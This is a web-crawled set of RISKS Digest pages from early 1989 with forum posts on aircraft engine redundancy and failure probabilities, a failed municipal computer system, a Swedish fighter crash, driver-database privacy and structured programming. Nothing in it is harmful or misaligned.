<H3><A NAME="subj4.1">
 Random Thoughts on Redundancy
</A>
</H3>
<address>
&lt;<A HREF="mailto: Boebert@DOCKMASTER.ARPA">
 Boebert@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Wed, 25 Jan 89 14:22 EST
</i><PRE>

From "Flight" magazine, many years ago:  The Chairman of Rolls-Royce [which
makes aircraft engines] was asked why he always flew the Atlantic in
four-engined aircraft.  His reply:  "Because there are no five-engined
aircraft." The same magazine once noted that a mechanical engineer looks out an
aircraft window, sees four engines, and relaxes with a drink; the expert on
fuel contamination looks at the same sight and tightens his or her seat belt.
So maybe the only fundamental truth is that we are all prisoners of our
metaphors, and never more so than in the software business.

On a less philosophical note, people interested in the issue of engine
redundancy might find it worthwhile to look up the chapter in "Spirit of
St.  Louis" where Lindbergh presents the tradeoffs that led him to
choose a single-engined aircraft for his attempt.

To get an idea of how such tradeoffs go, first consider my experience in
working on the software design for a generic triple-redunant autopilot,
where I discovered that 85% of the logic was in redundancy management.
This is a step forward in reliability?

Then look at the Honeywell autopilot for the Saab JA37b fighter.  This
was, as far as I have been able to tell, the first digital fly-by-wire
system ever put in an operational aircraft.  It was a single-channel
system, with flight-critical functions backed up in the air data
computer, and analyzed to a fare-thee-well (Honeywell had to *demo* that
all possible short circuits between two arbitrary pins resulted in an
orderly transition to the backup mode).  Last I heard a couple of
hundred of them had been flying for over a decade without incident.  So
redundant is neat, but simple and well-understood ain't bad either.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
One last word about probabilities
</A>
</H3>
<address>
Dr Robert Frederking
&lt;<A HREF="mailto:ref@ztivax.siemens.com ">
ref@ztivax.siemens.com 
</A>&gt;
</address>
<i>
Wed, 1 Feb 89 17:59:14 -0100
</i><PRE>
Organization: Siemens AG in Munich, W-Germany

At great personal RISK to my ego, let me suggest that nobody has gotten the
numbers right yet, even ignoring questions of whether independence, etc.,
holds in this case.  For a three engine plane, where p is the probability of
failure,
	P(all three fail) = p**3
	P(any 2 fail) = 3p**2(1-p)
	P(any 1 fails) = 3p(1-p)**2
	P(none fail) = (1-p)**3
This has the rather important property that all the probabilities add to 1.
The key is to realize that the plane can be in eight states with respect to
engine failure, each state's P is obtained by multiplication, and you add
together all states that are essentially equivalent (differing only in which
engine(s) are out).  Thus
	P(crashing) = 3p**2-2p**3, if it can fly on 2 engines.

Similarly for two engines,
	P(both fail) = p**2
	P(one fails) = 2p(1-p)
	P(none fail) = (1-p)**2
which also happily adds to 1.
	P(one or both out) = 2p-p**2, which (I believe) is always bigger.

As an aside, as I understand it, the FAA requires all airliners in the US to
have more than one engine, and to be able to fly to a safe landing with one
out.
 
	Robert Frederking	 	ARPA: ref%ztivax@siemens.siemens.com
	Siemens AG/ZFE F2 INF 23 	 or : unido!ztivax!ref@uunet.UU.NET
	Otto-Hahn-Ring 6		UUCP: ...!unido!ztivax!ref
	D-8000 Munich 83  West Germany	Phone: (-89) 636 47129

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Independence and probabilities
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Wed, 1 Feb 1989 10:20:55 PST
</i><PRE>

It must be remembered throughout that the classical binomial probabilities
assume independence.  Cross-wiring throws that assumption for a loop.
Subsequent to the 8 January crash of the British Midlands Airways 737 (where
speculation still focuses on a wiring defect), FAA inspections have now turned
up cross-wiring in engine or cargo-hold fire warning systems in at least four
other planes.  This is a particularly insidious type of problem, because it
normally would be significant only in time of emergency, and under normal
operation would have no effect (and remain undetected).

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: Counting engines
</A>
</H3>
<address>
Mike Bell 
&lt;<A HREF="mailto:mb@camcon.co.uk">
mb@camcon.co.uk
</A>&gt;
</address>
<i>
27 Jan 89 12:39:34 GMT
</i><PRE>
Organization: Cambridge Consultants Ltd., Cambridge, UK

Of course, an increase in the number of aircraft engines actually
*increases* the chance of catastrophic failure:  if each engine has a
probability p of losing a turbine blade in such a way that fuel lines
are severed and a major fire ensues, then if an aircraft has N engines
the probability of failure is clearly N*p, so a one-engined jet is
clearly safer, and a glider is safer still:-)

And then again, the complexity of systems interconnecting the engines
increases non-linearly:  you can't have cross-wiring faults between
engines on a single-engined aircraft.

The point is simple:  duplicating part of a system doesn't *guarantee* an
improvement in overall safety, and indeed, can reduce it.  ("This nuclear sub
has two reactors so that if one should melt down, the second can...")

-- Mike Bell -- &lt;mb@camcon.co.uk&gt;, &lt;mb@camcon.uucp&gt; or even &lt;...!ukc!camcon!mb&gt;

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Talk by Roy Saltman on computerized vote tallying
</A>
</H3>
<address>
Charles Youman (youman@mitre.org) 
&lt;<A HREF="mailto:m14817@mitre.mitre.org">
m14817@mitre.mitre.org
</A>&gt;
</address>
<i>
Wed, 01 Feb 89 11:14:38 EST
</i><PRE>

Roy G. Saltman of the National Institute of Standards and Technology
(formerly NBS) will be speaking on the topic "Accuracy, Integrity, and
Security in Computerized Vote Tallying" at the February meeting of the
Washington, DC Chapter ACM.  The meeting will be held on Thursday,
February 16, 1989, at the Rosslyn Holiday Inn, 1850 North Fort Myer Drive,
Arlington, Virginia.  The talk will begin at 8:00 p.m.  There is an optional
dinner preceding the talk which starts at 7:00 p.m.  Reservations are 
required only for the dinner (cost $14) and can be made by calling
(202) 659-2319 by noon on Tuesday, February 14.

The talk summarizes an extensive report on this subject recently published
by Mr. Saltman at NIST.  The talk concerns protections against manipulation
and fraud in the use of computer programs and hardware in computerized
vote tallying.  Recommendations concerning hardware, software, operational
procedures, and internal control concepts are presented.

                     [Saltman's excellent report was cited in <A HREF="/Risks/7.52.html">RISKS-7.52</A>.  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.18.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.20.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-70</DOCNO>
<DOCOLDNO>IA012-000131-B037-385</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.20.html 128.240.150.127 19970217025401 text/html 25770
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:52:25 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 20</TITLE>
<LINK REL="Prev" HREF="/Risks/8.19.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.21.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.19.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.21.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 20</H1>
<H2> Sunday 5 February 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  FAA and flying under pressure in Alaska 
</A>
<DD>
<A HREF="#subj1.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  New use for Credit Cards (?) 
</A>
<DD>
<A HREF="#subj2.1">
Leslie Chalmers
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Computer Chaos in Burnaby 
</A>
<DD>
<A HREF="#subj3.1">
Stuart Lynne
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Swedish fighter plane crash 
</A>
<DD>
<A HREF="#subj4.1">
Otto J. Makela
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Massachusetts limits disclosure of driver's license database.    
</A>
<DD>
<A HREF="#subj5.1">
Jerome H Saltzer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  "Computer Literacy Education" Report Available 
</A>
<DD>
<A HREF="#subj6.1">
Ronni Rosenberg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Engineering vs. Programming 
</A>
<DD>
<A HREF="#subj7.1">
Lynn R Grant
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: Structured Programming 
</A>
<DD>
<A HREF="#subj8.1">
Al Arsenault
</A><br>
<A HREF="#subj8.2">
 Allen Gordon
</A><br>
<A HREF="#subj8.3">
 Dan Franklin
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
FAA and flying under pressure in Alaska
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Fri, 3 Feb 1989 16:42:10 PST
</i><PRE>

Barometric pressure reached 31.85 inches at Northway, Alaska, on 1 Feb 89, the
highest ever recorded in North America, and the third highest in the world.
(This followed temperatures that unofficially reached -82 F; the official
weather bureau thermometer conked out at -80.)  Because most aircraft
altimeters could not provide accurate readings, the FAA grounded all air
traffic that would require requiring instrument approaches.  [Source:  San
Francisco Chronicle, 2 Feb 89, p. A2]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
New use for Credit Cards (?)
</A>
</H3>
<address>
&lt;<A HREF="mailto:Chalmers@DOCKMASTER.ARPA">
Chalmers@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Sat, 4 Feb 89 15:47 EST
</i><PRE>

The following appeared in a newsletter from my company's travel
agency that came with an airline ticket I received recently.

  The phrase 'one card does it all' is taking on new meaning.  This month,
  Hyatt Hotels Corp. is testing a system that will allow a credit card to be
  used as a hotel room key.  When the guest checks in by presenting a credit
  card, the hotel's system will alert its in-house system to allow entry to the
  guest's assigned room when the guest's credit card is inserted.

  The new feature, to be tested at the Hyatt Regency in San Francisco, is just
  one element in the major hotel chains' efforts to increasingly cater to
  business travelers.

  Automated check-in and check-out systems - with 800 numbers and videos - are
  already in place in some hotels.  Watch for other chains to join the
  automation revolution.  Ramada Hotels is evaluating a similar program that
  allows check-in, room key use and check-out all using a cellular machine.
  Guests will be able to slip the card through a machine for automatic
  check-in, and the machine will assign the guest a room and encode that room
  to accept the guest's card.

  At check-out, a similar procedure is followed.  When more than one guest is
  staying in a room, the hotel can make a blank card that will allow room
  entry.

I would say their are many risks associated with this (but not obvious enough
for the hotels to notice), but the sentence that really stopped me was the last
one.  One interpretation of this is that the hotels will be equipped with
credit card duplicating machines, some of which won't even be restricted to
hotel employees! Granted, these duplicate cards won't *look* like real cards,
but they will probably be good enough to fake out any machine which reads the
mag stripe on cards.  (Telephones which take credit cards come to mind
immediately.)

An alternative interpretation is that the extra cards will be coded to contain
values that are recognized by the hotel security system but which are not
exact replications of the credit card mag stripe.  I sure hope this is right,
but somehow I doubt it.
                                             Leslie
(The usual disclaimers apply.)

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Computer Chaos in Burnaby
</A>
</H3>
<address>
pri=-10 Stuart Lynne
&lt;<A HREF="mailto:sl@van-bc.UUCP ">
sl@van-bc.UUCP 
</A>&gt;
</address>
<i>
4 Feb 89 08:01:59 GMT
</i><PRE>
Organization: Public Access Network, Vancouver, BC.

Yet another example of a very poorly executed computer system!

From the Vancouver Sun, Thursday, February 2, 1989
  Burnaby's computer chaos started with obsolete system
  Jeff Lee - Sun Regional Affairs Reporter

A computer system Burnaby bought three years ago for $200,000 that ended up
costing more than $1.2 million to make operational was obsolete when it was
chosen, a report on the purchase indicates.  The report released this week,
also cited in-fighting among the muncipal departments, a flawed tendering
process and lack of detailed plan as key reasons why the project "ran out of
control."

Burnaby Mayor Bill Copeland said the report also shows council was not kept
informed of the problems encountered in trying to make a prepared database
system work effectively.  "It was not flagged for council. Even though some of
us (on council) were questioning the high cost of the system, at no time until
it was too late did our staff come forward and say the had problems," he said.
Copeland called the computer system "a money-eating monstrosity" and promised
to find out why staff never told council, and why they never caught on to the
fact the system was designed in 1965.  He said it is too early to tell if staff
will be disciplined, but council "is disappointed in our manager and director
of administration. It appears our staff did not advise us when they should have.

Rumours circulated

Copeland said rumors had been circulating for some time about the systems's
cost overruns, but no formal report was prepared until manager Mel Shelley
ordered an independant audit in mid-1988.  The report, prepared by consultant
Brian Mullen, not only showed the system was obsolete, but said the decision to
make "enhancements" to it to make it fit Burnaby's needs was unwise.  The
system failed an average of twice a week in 1988. It "is unreliable," Mullen
said.

The municipality chose New York-based Information Associates Ltd. to provide
the software after it received only two other bids, one of which was
disqualified at an early stage.  A staff report at the time said the system
would cost $118, plus an additional $70,000 to modify the software to Burnaby's
needs,.  Mullen said many computer companies would have bid on the project had
the system of tendering been relaxed. He said the terms of the bidding process
were so retrictive that companies would have had to spend up to $10,000
preparing for a $100,000 bid.  He also pointed the finger at infighting between
the information services department and other agencies over the choice of the
system.  Nearly $450,000 was spent on a computer consultancy firm that worked
for 2 1/2 years trying to make the system work.

Municipal manager Shelley said he is preparing a report for council for Monday,
and did not want to comment publicly before then.  A spokesman for Information
Associates' Canadian offices in Toronto could not be reached.

--- end of article ---

Comments:
	- note politician trying to CYA by claiming that he wasn't informed.
	- no overall plan
	- over restrictive tendering policies limited competitive bidding
	- office politics

Not noted in this article but mentioned in a smaller article last week was
the fact that the requirements where changed frequently.

I'm going to try and track down some more info next week. But it seems that
this is a clear case of incompentence on the part of the people in charge of
the project. They don't seem to have handled *anything* correctly.

Stuart.Lynne@wimsey.bc.ca {ubc-cs,uunet}!van-bc!sl    Vancouver,BC,604-937-7532

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
 Swedish fighter plane crash
</A>
</H3>
<address>
&lt;<A HREF="mailto:makela@tukki.jyu.fi">
makela@tukki.jyu.fi
</A>&gt;
</address>
<i>
Fri, 3 Feb 89 13:18:49 +0200
</i><PRE>

  The only existing prototype of the Swedish fighter plane JAS was destroyed
in a crash at Linkoping on Thursday.  The plane was making a landing after it's
7th test flight, when for reasons unknown the plane rolled sharply to it's
left, causing the left wingtip to hit the ground.  The plane then rolled wildly
to the left side of the runway, losing it's wings and landing gear.
Suprisingly enough, the main airframe was left relatively intact, and the
pilot escaped with a broken arm.
  According to specialists, the most probable cause of the accident was a
technical failure.  As the plane in question is designed for supersonic speeds,
it is non-stable at subsonics.  This would probably mean computer failure.
  The whole accident happened before the cameras of the TV-Aktuellt crew.
The fighter project has already been criticized severely, since is already 7
billion Swedish kronor (the American usage, ie 7000 million; around one billion
US$) over budget and 1 1/2 years late.  The Saab-Scania military airplane
section has contract for 30 JAS fighters at a fixed price, with an option for
150 planes more if there is an agreement on pricing.  The Swedish air force
has an estimated need for 300-400 planes after the year 2000.  Also the Finnish
air force has been interested in the plane.

Otto J. Makela (with poetic license to kill), University of Jyvaskyla

InterNet: makela@tukki.jyu.fi, BitNet: MAKELA_OTTO_@FINJYU.BITNET
BBS: +358 41 211 562 (V.22bis/V.22/V.21, 24h/d), Phone: +358 41 613 847
Mail: Kauppakatu 1 B 18, SF-40100 Jyvaskyla, Finland, EUROPE

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Massachusetts limits disclosure of driver's license database.
</A>
</H3>
<address>
Jerome H Saltzer 
&lt;<A HREF="mailto:jhs%computer-lab.cambridge.ac.uk@NSS.Cs.Ucl.AC.UK">
jhs%computer-lab.cambridge.ac.uk@NSS.Cs.Ucl.AC.UK
</A>&gt;
</address>
<i>
Thu, 2 Feb 89 14:05:09 gmt
</i><PRE>
         (<A HREF="/Risks/8.19.html">RISKS-8.19</A> )
[ From:  &lt;Saltzer@Athena.MIT.EDU&gt; ]

Jon Jacky comments, 

  What I find notable about this story is the linkage between selling
  personal information in government databases to anyone who asks and
  legitimate law enforcement activities.  It seems in this case it is
  felt you cannot limit the first without hampering the other.  I can't
  tell from this account whether that is a technical consequence of the
  way the database works, follows from the legalities somehow, or is
  just a misconception.

The answer lies somewhere in between; it has little to do with computers or
online databases, and civil libertarians in Massachusetts have fought a running
battle on the subject for many years.  The Registrar of Motor Vehicles has
taken a position from time immemorial that your driver's license and your
vehicle registration are matters of public record, and it has always made all
the information in its files available to anyone who requests.  With the
automation of the Registry databases, the Registrar balanced the possibility of
increased invasion of privacy against the possibility of increased revenue to
the Registry (from selling the entire database on tape) and sprang for the
revenue.  Those of us who register their new car in Massachusetts are
accustomed to receiving computer-generated letters from rustproofing companies
that start out "Dear Mr. Smith: I'll bet you want to protect your investment in
your new Toyota. . ."

Occasionally someone makes some progress against this particular problem; a few
years ago the Registry grudgingly began to allow people to request that their
social security number not be used as their driver's license identification
number.  But this flexibility is not publicized, and only those with enough
interest in privacy to ask discover it.  As a result you can construct a list
of what some people would consider Massachusetts "troublemakers" by purchasing
the Registry database and going through it to look for identification numbers
that don't pass social security number validity tests.

The legal maneuvering that Jacky reported should be viewed in the light of the
traditional Registry position.  The first bid was to simply cut off all access
to the information; I doubt that anyone expected that position to hold, but it
had the entirely reasonable effect of forcing the Registry to make explicit
arguments about who really needed to share the information and why.  From a
strategic point of view, the procedure may have been close to optimum--it took
only two steps, and the result is certainly a big improvement.  It remains to
be seen whether or not the Registry finds some way to wriggle around the new
rulings.
          			Jerry Saltzer

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
"Computer Literacy Education" Report Available
</A>
</H3>
<address>
Ronni Rosenberg
&lt;<A HREF="mailto:ronni@juicy-juice.lcs.mit.edu ">
ronni@juicy-juice.lcs.mit.edu 
</A>&gt;
</address>
<i>
Thu, 2 Feb 89 00:28:59 EST
</i><PRE>

Many thanks to all who sent me messages about computer literacy. In about
three weeks, my Ph.D. thesis will be available as a technical report from
MIT's Laboratory for Computer Science (LCS-TR-433, January 1989).  If you
would like a copy, you can request it from the lab or from me.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
 Engineering vs. Programming
</A>
</H3>
<address>
Lynn R Grant 
&lt;<A HREF="mailto:Grant@DOCKMASTER.ARPA">
Grant@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Wed, 1 Feb 89 16:00 EST
</i><PRE>

Over the years I have heard many arguments about why engineering is a
science and programming is not, and I have even believed some of them,
since I went to engineering school before I got into the computer
business.  It has finally occurred to me what the real difference is.

Engineers do a better job of design, not because they are more professional
than programmers, but because they must.  When you design a radio or an
automobile, there are hundreds of people wo must get involved in order to build
it.  You can't sit down and discuss it with every one of them, so you must
clearly document what you want in order to give them half a chance of building
it right.

When you design a program, the design and the program can be one and the
same, so a lower level of design documentation is possible.

As evidence of the fact that engineers design better because they must, not
because they are by nature more professional, I submit the fact that
microprocessors are being put into all sorts of formerly hardware driven
devices, and hardware is being microprogrammed, for the most part, I believe,
to get around the great overhead of engineering documentation.  And we are now
getting hardware that has the same sort of failures caused by insufficient
design that we have always experienced in programming projects.

Lynn R. Grant,    Consultant,    Computer Associates International, Inc.
                  The opinions here are, of course, my own.

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 Re: Structured Programming
</A>
</H3>
<address>
Al Arsenault 
&lt;<A HREF="mailto:AArsenault@DOCKMASTER.ARPA">
AArsenault@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Thu, 2 Feb 89 13:02 EST
</i><PRE>

I learned a couple of years ago that one can teach students some very valuable
lessons about what 'structured programming' really is and why it's useful while
they're at a relatively impressionable stage of their careers (I moonlight as
an instructor of computer science at a local university.)

I noticed that many students had as an overriding goal getting the programs
they write for class to work right - "style" and "structure" took a back seat
to generating the right output.  So, I assigned two projects, which were
identical except that a particular data structure had to be implemented one way
in the first assignment and a different way in the second one.  Then, I gave
the students approximately three weeks to complete the first assignment, but
only about one week to do the second.  (This was a second programming class for
most students, and the assignment took about 1,000 lines of Pascal code, so it
was a major undertaking for most student.)

The result was that those who had written the first program "properly" (i.e.,
lots of modularity, information hiding, and other buzzwords) had to make only a
few modifications to complete the second assignment, while those who had
programmed without any sense of structure got to write the entire thing over
from scratch.

Several former students have since told me that it taught them a very valuable
lesson, which they have carried with them into their professional careers.

It's something like spilling a drink on your keyboard:  once you've been burned
by something once, you usually learn not to do it again.
                                                             Al Arsenault

</PRE>
<HR><H3><A NAME="subj8.2">
RE: Structured Programming (<A HREF="/Risks/8.19.html">RISKS-8.19</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:GORDON_A%CUBLDR%VAXF.COLORADO.EDU@CUNYVM.CUNY.EDU">
GORDON_A%CUBLDR%VAXF.COLORADO.EDU@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Thu, 2 Feb 89 11:52 MST
</i><PRE>

I would like to add an example to the discussion of structured code etc.
Several years ago I worked for a couple of years for a software house that
produced a turn-key accounting system.  It ran on a POINT 4 mini (DG NOVA
clone) under IRIS.  This is not a favorable environment for development! Worse
the entire system consisting of over 1000 modules was written in Business
Basic!.  To make the matters worse the system was written for the Leasing
Industry, which has perhaps one of most nightmarish accounting schemes
imaginable since there are lots of ways to structure leases.  Anyway, the
design of the database was, in principle, masterful.  There were master files
which contained the names and locations of virtually every file, field and
program, inaddition to the records and files which contained data.  On the
other hand the programs were written in a "spaghetti code", using 2-character
variable names (the limit for business basic).  No attempt was ever implemented
to use some of the tools available and precompilers.  Needless to say
maintenance was literally a nightmare.  Implementing changes were worse.  If a
field in a control or data file or record were changed, there was no way to
track which of the 1000 modules were affected until after the modified software
was put into use by the client and they screamed back at us.

The masterful design of the database was also one of its weaknesses.  Everytime
during data entry operations, a record was written to the database, a couple of
hundred disk reads had to be performed in order to get all of the locations,
etc., of the files, programs, etc.  Since this was a time share system,
multiplying that by 30 or 40 data entry operators in addition to other
personnel doing various system operations, brought the system to its knees.
The disk drives were simply overwhelmed with swapping and the necessary file
read and write operations.  Fixes were implemented but it was like installing
after-market items on a '56 chevy to make it go fast.  Of course even if the
programs were structured, the performance problem would not have been fixed.
The catch-22 was that because of the problems with maintenance we had no time
to implement real fixes.
                                  Allen Gordon

</PRE>
<HR><H3><A NAME="subj8.3">
 Re: Structured Programming
</A>
</H3>
<address>
Dan Franklin 
&lt;<A HREF="mailto:dan@WATSON.BBN.COM">
dan@WATSON.BBN.COM
</A>&gt;
</address>
<i>
Fri, 3 Feb 89 13:39:12 EST
</i><PRE>

A recent message on this topic asked if anyone was still carrying out
studies of what programming practices contribute to errors.  The
answer is emphatically yes!

"Delocalized plans" are one example of a programming practice that's
been demonstrated to cause errors.  This phrase refers to a procedure
for performing some action -- a "plan" -- whose steps are spread
through the actual code -- "delocalized".  Delocalized plans are a
fruitful source of maintenance errors, because maintenance programmers
generally don't (and often can't) read through an entire program
before they start making what appears to be a small, localized change.

One recent article on delocalized plans appears in CACM, Vol 31 No 11 (November
1988): "Designing Documentation to Compensate for Delocalized Plans" (Soloway
et al).  The article is a bit more general than the title implies; the general
problem of delocalized plans is discussed as well as documentation issues.
(This article is a follow-on to discussions of delocalized plans in the book
"Empirical Studies of Programmers", Soloway and Iyengar, Eds, Ablex, N.J.,
1986, as well as an article in IEEE Software, May 1986, "Delocalized Plans and
Program Comprehension".)

The authors discuss an experiment using a 14-module, 250-line Fortran program
that performs simple database operations.  Different programmers were asked to
modify the program to add an "undelete" feature, which would restore deleted
records in the database.  It looks like a simple task, because deleted records
are not actually removed, merely marked "deleted".  The trick is that the
obvious method of calling the search routine to find the record, then clearing
the deletion mark, doesn't work because the search routine skips over deleted
records.  In other words, deletion itself is done by a "delocalized plan" that
affects both the delete routine itself and the search routine.  Many
programmers asked to make the change didn't realize that.

This simple experiment shows a language-independent source of maintenance
errors and (to me, at least) indicates that to the extent practical, you should
try to group together all the steps that perform some operation, rather than
scattering them throughout the code.  Obvious?  Perhaps; but in a world where
some people think indenting code is a bad idea, even obvious conclusions
apparently need to be demonstrated.
                                               	Dan Franklin

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.19.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.21.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-71</DOCNO>
<DOCOLDNO>IA012-000131-B037-409</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.21.html 128.240.150.127 19970217025433 text/html 19265
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:52:43 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 21</TITLE>
<LINK REL="Prev" HREF="/Risks/8.20.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.22.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.20.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.22.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 21</H1>
<H2> Sunday 5 February 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
